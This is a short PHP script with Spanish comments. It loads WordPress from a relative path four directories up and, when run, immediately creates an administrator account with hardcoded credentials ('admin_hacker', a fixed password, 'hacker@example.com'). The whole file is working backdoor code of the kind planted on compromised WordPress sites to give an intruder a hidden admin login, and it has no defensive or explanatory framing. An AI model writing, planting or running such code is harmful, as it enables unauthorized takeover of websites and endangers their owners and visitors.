<?php
// Conectar a la base de datos de WordPress directamente
function add_admin_user_wp($username, $password, $email) {
    // Incluir el archivo de configuración de WordPress
    require_once('../../../../wp-load.php');
    
    // Verificar si el usuario ya existe
    if (!username_exists($username)) {
        // Crear el nuevo usuario
        $user_id = wp_create_user($username, $password, $email);
        
        // Asignar rol de administrador
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        
        return "Usuario administrador creado exitosamente!";
    } else {
        return "El usuario ya existe!";
    }
}

// Uso del script - cambiar estos valores
$new_username = 'admin_hacker';
$new_password = 'P@ssw0rd123!';
$new_email = 'hacker@example.com';

// Ejecutar la función
echo add_admin_user_wp($new_username, $new_password, $new_email);
?>
